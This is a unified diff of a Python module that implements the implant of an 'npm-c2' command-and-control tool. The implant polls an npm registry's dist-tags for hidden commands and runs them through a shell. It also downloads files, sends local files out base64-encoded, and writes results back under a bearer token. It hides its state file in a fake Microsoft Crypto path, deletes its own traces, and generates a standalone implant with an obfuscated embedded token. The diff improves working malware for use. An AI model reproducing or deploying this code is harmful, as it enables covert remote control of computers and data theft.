@@ -1,178 +1,266 @@
-import urllib.request
-import urllib.error
-import json
-import subprocess
-import time
-import random
-import sys
-import base64
-import os
+"""Implant side: poll dist-tags, execute, write results back."""
 
-from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, MAX_TAG_LEN
-from . import API, UA, decode_tag
+from __future__ import annotations
+
+import base64
+import collections
+import json
+import os
+import random
+import subprocess
+import sys
+import time
+import urllib.error
+import urllib.request
+
+from . import (CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, MAX_TAG_LEN,
+               PREFIXES, _FRAME_OVERHEAD, _MAX_CHUNKS, _SCOPED)
+from . import API, UA, group_chunks, encode_payload, decode_tag, registry_path
+
+DEFAULT_TIMEOUT = 30
+MAX_CAPTURE = 1000          # chars of stdout+stderr kept per command
+MAX_UPLOAD = 3000           # bytes per up: reply (base64 grows 4/3)
+SEEN_CAP = 512              # tags remembered between polls
 
 
 class Implant:
     def __init__(self, package, token=None, interval=60, jitter=20, verbose=False):
         self.package = package
+        self.url = API.format(registry_path(package))
         self.token = token
-        self.interval = interval
-        self.jitter = jitter
+        self.interval = max(10, int(interval))
+        self.jitter = max(0, int(jitter))
         self.v = verbose
-        self.seen = set()
+        # Ordered so overflow evicts the oldest tag, not an arbitrary one.
+        self.seen: collections.OrderedDict[str, None] = collections.OrderedDict()
         self.n = 0
         self.dirty = 0
         safe = package.replace("/", "_").replace("@", "")
-        appdata = os.environ.get("APPDATA",
-                   os.environ.get("TEMP", os.path.expanduser("~")))
+        appdata = os.environ.get("APPDATA") or os.environ.get("TEMP") \
+            or os.path.expanduser("~")
         self.state_file = os.path.join(appdata, "Microsoft", "Crypto",
                                        f".rsa_{safe}.idx")
 
+    # ------------------------------------------------------------ main loop
     def run(self):
         self._load()
         try:
             while True:
                 try:
-                    tags = self._fetch()
-                    cmds = self._parse(tags)
-                    for cmd in cmds:
-                        if self.v:
-                            print(f"[+] cmd: {cmd[:60]}")
-                        out = self._exec(cmd)
-                        if out and self.token:
-                            self._reply(out)
-                    self.n += 1
-                    if self.n % 10 == 0:
-                        if self.dirty:
-                            self._save()
-                            self.dirty = 0
-                        if self.token:
-                            self._beat()
-                except Exception:
-                    pass
+                    self._cycle()
+                except Exception as e:                       # noqa: BLE001
+                    # Never silent: a broken channel that looks healthy is
+                    # worse than a noisy one.
+                    if self.v:
+                        print(f"[!] cycle failed: {type(e).__name__}: {e}",
+                              file=sys.stderr)
                 if self.v:
                     print(f"[*] poll #{self.n}")
-                delay = self.interval + random.uniform(0, self.jitter)
-                time.sleep(delay)
+                time.sleep(self.interval + random.uniform(0, self.jitter))
         finally:
             if self.dirty:
                 self._save()
 
+    def _cycle(self):
+        tags = self._fetch()
+        for cmd in self._parse(tags):
+            if self.v:
+                print(f"[+] cmd: {cmd[:60]}")
+            out = self._exec(cmd)
+            if out and self.token:
+                self._reply(out)
+        self.n += 1
+        if self.n % 10 == 0:
+            if self.dirty:
+                self._save()
+                self.dirty = 0
+            if self.token:
+                self._beat()
+
+    # ---------------------------------------------------------------- state
     def _load(self):
         try:
-            with open(self.state_file) as f:
+            with open(self.state_file, encoding="utf-8") as f:
                 for line in f:
                     line = line.strip()
                     if line:
-                        self.seen.add(line)
+                        self.seen[line] = None
         except FileNotFoundError:
-            pass
+            return
+        except OSError as e:
+            if self.v:
+                print(f"[!] state read failed: {e}", file=sys.stderr)
 
     def _save(self):
         try:
-            d = os.path.dirname(self.state_file)
-            if not os.path.isdir(d):
-                os.makedirs(d, exist_ok=True)
-            with open(self.state_file, "w") as f:
-                for tag in sorted(self.seen):
+            os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
+            tmp = self.state_file + ".tmp"
+            with open(tmp, "w", encoding="utf-8") as f:
+                for tag in self.seen:
                     f.write(tag + "\n")
-        except Exception:
-            pass
+            os.replace(tmp, self.state_file)      # atomic: no truncated state
+        except OSError as e:
+            if self.v:
+                print(f"[!] state write failed: {e}", file=sys.stderr)
 
-    def _fetch(self):
-        req = urllib.request.Request(API.format(self.package),
-                                     headers={"User-Agent": UA})
+    def _remember(self, tag):
+        self.seen[tag] = None
+        self.dirty += 1
+        while len(self.seen) > SEEN_CAP:
+            self.seen.popitem(last=False)         # drop the oldest first
+
+    # ---------------------------------------------------------------- fetch
+    def _fetch(self) -> dict:
+        req = urllib.request.Request(self.url, headers={"User-Agent": UA})
         with urllib.request.urlopen(req, timeout=15) as r:
-            return json.loads(r.read())
+            data = json.loads(r.read())
+        if not isinstance(data, dict):
+            raise ValueError("registry returned no dist-tags object")
+        return data
 
-    def _parse(self, tags):
-        cmds = []
-        for name in tags:
-            if not name.startswith(CMD_PREFIX):
-                continue
-            if name in self.seen:
-                continue
-            info = decode_tag(name)
-            if info:
-                self.seen.add(name)
-                self.dirty += 1
-                if len(self.seen) > 128:
-                    self.seen.pop()
-                cmds.append(info[1].decode(errors="replace"))
-        return cmds
+    def _parse(self, tags) -> list[str]:
+        commands: list[str] = []
+        fresh = [t for t in tags if t not in self.seen]
+        for buf, complete in group_chunks(fresh, CMD_PREFIX):
+            if not complete:
+                continue                          # wait for missing chunks
+            commands.append(buf.decode("utf-8", errors="replace"))
+        for tag in fresh:
+            if tag.startswith(CMD_PREFIX):
+                self._remember(tag)
+        return commands
 
+    # -------------------------------------------------------------- execute
     def _exec(self, cmd):
         try:
             if cmd == "exit":
                 self._clean()
-                sys.exit(0)
+                raise SystemExit(0)
 
             if cmd.startswith("sleep:"):
-                val = cmd.split(":", 1)[1]
-                self.interval = max(10, int(val))
+                raw = cmd.split(":", 1)[1]
+                try:
+                    value = int(raw)
+                except ValueError:
+                    return f"sleep: bad value {raw!r}"
+                self.interval = max(10, value)     # same floor as the constructor
+                self._save()
                 return f"interval={self.interval}"
 
             if cmd.startswith("dl:"):
-                parts = cmd.split(":", 2)
-                if len(parts) == 3:
-                    return self._dl(parts[1], parts[2])
-                return "dl: <url>:<path>"
+                rest = cmd[3:]
+                cut = self._split_dl(rest)
+                if cut < 0:
+                    return "dl: expected dl:<url>:<path>"
+                url, path = rest[:cut].strip(), rest[cut + 1:].strip()
+                if not url or not path:
+                    return "dl: expected dl:<url>:<path>"
+                return self._dl(url, path)
 
             if cmd.startswith("up:"):
-                path = cmd.split(":", 1)[1]
-                try:
-                    with open(path, "rb") as f:
-                        data = base64.b64encode(f.read())[:1000]
-                        return data.decode(errors="replace")
-                except Exception as e:
-                    return f"up fail: {e}"
+                return self._upload(cmd.split(":", 1)[1])
 
-            body = cmd
-            if cmd.startswith("exec:"):
-                body = cmd[5:]
-
-            r = subprocess.run(body, shell=True, capture_output=True, timeout=30)
+            body = cmd[5:] if cmd.startswith("exec:") else cmd
+            if not body.strip():
+                return "(empty command)"
+            r = subprocess.run(body, shell=True, capture_output=True,
+                               timeout=DEFAULT_TIMEOUT)
             out = r.stdout.decode(errors="replace")
             err = r.stderr.decode(errors="replace")
-            return (out + err).strip()[:1000] or "(ok)"
+            combined = (out + err).strip() or "(ok)"
+            if len(combined) > MAX_CAPTURE:
+                cut = len(combined) - MAX_CAPTURE
+                combined = combined[:MAX_CAPTURE] + f"\n[truncated {cut} chars]"
+            return combined
         except subprocess.TimeoutExpired:
-            return "(timeout)"
-        except Exception as e:
-            return f"({e})"
+            return f"(timeout after {DEFAULT_TIMEOUT}s)"
+        except SystemExit:
+            raise
+        except Exception as e:                          # noqa: BLE001
+            return f"({type(e).__name__}: {e})"
+
+    @staticmethod
+    def _split_dl(rest):
+        """Index of the ':' separating the URL from the destination path.
+
+        Both sides can contain colons (``http://host:8080/x.exe`` and
+        ``C:\\temp\\x.exe``), so the separator is the first colon past the
+        authority whose right-hand side starts like a path.
+        """
+        def looks_like_path(tail):
+            return bool(tail) and (tail[0] in "/\\" or
+                                   (len(tail) > 1 and tail[1] == ":" and tail[0].isalpha()))
+
+        scheme = rest.find("://")
+        if scheme >= 0:
+            start = scheme + 3
+        elif len(rest) > 2 and rest[1] == ":" and rest[0].isalpha():
+            start = 2                      # C:\... destination vs. source
+        else:
+            start = 0
+
+        for i in range(start, len(rest)):
+            if rest[i] == ":" and looks_like_path(rest[i + 1:]):
+                return i
+        if scheme >= 0:
+            return rest.rfind(":")         # URL:path with a bare filename
+        return rest.find(":", start)
 
     def _dl(self, url, path):
-        req = urllib.request.Request(url)
-        with urllib.request.urlopen(req, timeout=30) as r:
+        with urllib.request.urlopen(url, timeout=30) as r:
             data = r.read()
-        d = os.path.dirname(os.path.abspath(path))
-        if not os.path.isdir(d):
-            os.makedirs(d, exist_ok=True)
+        parent = os.path.dirname(os.path.abspath(path))
+        os.makedirs(parent, exist_ok=True)
         with open(path, "wb") as f:
             f.write(data)
-        return f"dl {len(data)}b"
+        return f"dl {len(data)}b -> {path}"
 
+    def _upload(self, path):
+        path = path.strip()
+        if not path:
+            return "up: expected up:<path>"
+        try:
+            with open(path, "rb") as f:
+                raw = f.read(MAX_UPLOAD)
+                more = f.read(1)
+        except OSError as e:
+            return f"up fail: {e}"
+        data = base64.b64encode(raw).decode()
+        note = "+" if more else ""               # '+' marks a truncated read
+        return f"up {len(raw)}b{note}: {data}"
+
+    # -------------------------------------------------------------- writeback
     def _reply(self, out):
-        for tag in encode_payload(out.encode(), RES_PREFIX):
-            self._put(tag)
-        if self.v:
-            print(f"[+] result sent")
+        try:
+            for tag in encode_payload(out.encode(), RES_PREFIX):
+                self._put(tag)
+            if self.v:
+                print("[+] result sent")
+        except (ValueError, urllib.error.URLError) as e:
+            if self.v:
+                print(f"[!] result send failed: {e}", file=sys.stderr)
 
     def _beat(self):
-        nonce = os.urandom(3).hex()
-        self._put(f"{HBT_PREFIX}{nonce}")
+        self._put(f"{HBT_PREFIX}{os.urandom(3).hex()}")
 
     def _put(self, tag):
-        url = API.format(self.package) + "/" + tag
-        data = json.dumps(TAG_VALUE).encode()
+        url = f"{self.url}/{tag}"
         headers = {"User-Agent": UA, "Content-Type": "application/json"}
         if self.token:
             headers["Authorization"] = f"Bearer {self.token}"
-        req = urllib.request.Request(url, data=data, method="PUT",
-                                     headers=headers)
+        req = urllib.request.Request(url, data=json.dumps(TAG_VALUE).encode(),
+                                     method="PUT", headers=headers)
         try:
-            urllib.request.urlopen(req, timeout=15)
-        except Exception:
-            pass
+            with urllib.request.urlopen(req, timeout=15) as r:
+                return 200 <= r.status < 300
+        except urllib.error.HTTPError as e:
+            if self.v:
+                print(f"[!] PUT {tag[:24]}: HTTP {e.code}", file=sys.stderr)
+            return False
+        except urllib.error.URLError as e:
+            if self.v:
+                print(f"[!] PUT {tag[:24]}: {e.reason}", file=sys.stderr)
+            return False
 
     def _clean(self):
         if not self.token:
@@ -181,81 +269,82 @@ class Implant:
             for name in self._fetch():
                 if name.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)):
                     self._del(name)
-        except Exception:
-            pass
+        except Exception as e:                          # noqa: BLE001
+            if self.v:
+                print(f"[!] cleanup failed: {e}", file=sys.stderr)
 
     def _del(self, tag):
-        url = API.format(self.package) + "/" + tag
         headers = {"User-Agent": UA}
         if self.token:
             headers["Authorization"] = f"Bearer {self.token}"
-        req = urllib.request.Request(url, method="DELETE", headers=headers)
+        req = urllib.request.Request(f"{self.url}/{tag}", method="DELETE",
+                                     headers=headers)
         try:
-            urllib.request.urlopen(req, timeout=15)
-        except Exception:
-            pass
-
-
-def encode_payload(data, prefix=CMD_PREFIX):
-    b64 = base64.urlsafe_b64encode(data).rstrip(b"=").decode()
-    room = MAX_TAG_LEN - len(prefix) - 7
-    tags = []
-    for i in range(0, len(b64), room):
-        chunk = b64[i:i + room]
-        nonce = os.urandom(3).hex()
-        tags.append(f"{prefix}{nonce}_{chunk}")
-    return tags
+            with urllib.request.urlopen(req, timeout=15):
+                return True
+        except urllib.error.URLError:
+            return False
 
 
 def generate_standalone(token=None, package=None):
+    """Emit a dependency-free single-file implant."""
     import inspect
 
-    enc_src = inspect.getsource(encode_payload)
-    dec_src = inspect.getsource(decode_tag)
-    imp_src = inspect.getsource(Implant)
+    from . import deobfuscate_token as _deob, _xor as _xor_fn, _xor_key as _xor_key_fn
 
-    obf_hex = ""
-    pkg_name = package or "CHANGEME"
+    obf = ""
     if token and package:
         from . import obfuscate_token
-        obf_hex = obfuscate_token(token, package)
+        obf = obfuscate_token(token, package)
 
-    lines = [
+    parts = [
         "#!/usr/bin/env python3",
-        "import urllib.request, urllib.error, json, subprocess, time, random, sys, base64, os, argparse, hashlib",
+        "import argparse, base64, binascii, collections, hashlib, json, os",
+        "import random, subprocess, sys, time, urllib.error, urllib.request",
         "",
-        f'CMD_PREFIX = {repr(CMD_PREFIX)}',
-        f'RES_PREFIX = {repr(RES_PREFIX)}',
-        f'HBT_PREFIX = {repr(HBT_PREFIX)}',
-        f'TAG_VALUE = {repr(TAG_VALUE)}',
-        f'MAX_TAG_LEN = {MAX_TAG_LEN}',
-        f'API = {repr(API)}',
-        f'UA = {repr(UA)}',
+        f"CMD_PREFIX = {CMD_PREFIX!r}",
+        f"RES_PREFIX = {RES_PREFIX!r}",
+        f"HBT_PREFIX = {HBT_PREFIX!r}",
+        f"PREFIXES = {PREFIXES!r}",
+        f"TAG_VALUE = {TAG_VALUE!r}",
+        f"MAX_TAG_LEN = {MAX_TAG_LEN}",
+        f"API = {API!r}",
+        f"UA = {UA!r}",
+        f"_FRAME_OVERHEAD = {_FRAME_OVERHEAD}",
+        f"_MAX_CHUNKS = {_MAX_CHUNKS}",
+        f"_SCOPED = {_SCOPED!r}",
+        f"DEFAULT_TIMEOUT = {DEFAULT_TIMEOUT}",
+        f"MAX_CAPTURE = {MAX_CAPTURE}",
+        f"MAX_UPLOAD = {MAX_UPLOAD}",
+        f"SEEN_CAP = {SEEN_CAP}",
         "",
-        enc_src.strip(),
+        inspect.getsource(_xor_key_fn),
         "",
-        dec_src.strip(),
+        inspect.getsource(_xor_fn),
+        "",
+        inspect.getsource(_deob),
+        "",
+        inspect.getsource(registry_path),
+        "",
+        inspect.getsource(encode_payload),
+        "",
+        inspect.getsource(decode_tag),
+        "",
+        inspect.getsource(group_chunks),
+        "",
+        inspect.getsource(Implant),
         "",
     ]
-
-    if obf_hex:
-        lines += [
-            f'_OBFUSCATED = {repr(obf_hex)}',
+    if obf:
+        parts += [
+            f"_OBFUSCATED = {obf!r}",
             "",
-            "def deobfuscate_token(hexdata, pkg):",
-            "    key = hashlib.sha256(pkg.encode()).digest()[:16]",
-            "    raw = bytes.fromhex(hexdata)",
-            "    dec = bytes(a ^ b for a, b in zip(raw, key * (len(raw) // len(key) + 1)))[:len(raw)]",
-            "    try:",
-            "        return dec.decode()",
-            "    except UnicodeDecodeError:",
-            "        return None",
+            "def _embedded_token(pkg):",
+            "    return deobfuscate_token(_OBFUSCATED, pkg)",
             "",
         ]
 
-    lines += [
-        imp_src.strip(),
-        "",
+    parts += [
         "def main():",
         "    p = argparse.ArgumentParser(description='npm-c2 implant')",
         "    p.add_argument('--package', '-p', required=True)",
@@ -265,18 +354,18 @@ def generate_standalone(token=None, package=None):
         "    p.add_argument('--verbose', '-v', action='store_true')",
         "    a = p.parse_args()",
     ]
-    if obf_hex:
-        lines += [
-            "    tok = a.token or deobfuscate_token(_OBFUSCATED, a.package)",
-            "    Implant(a.package, tok, a.interval, a.jitter, a.verbose).run()",
-        ]
+    if obf:
+        parts.append("    tok = a.token or _embedded_token(a.package)")
     else:
-        lines += [
-            "    Implant(a.package, a.token, a.interval, a.jitter, a.verbose).run()",
-        ]
-    lines += [
+        parts.append("    tok = a.token")
+    parts += [
+        "    if not tok:",
+        "        print('[!] no token: this implant can execute but not reply',",
+        "              file=sys.stderr)",
+        "    Implant(a.package, tok, a.interval, a.jitter, a.verbose).run()",
+        "",
         "",
         "if __name__ == '__main__':",
         "    main()",
     ]
-    return "\n".join(lines)
+    return "\n".join(parts)
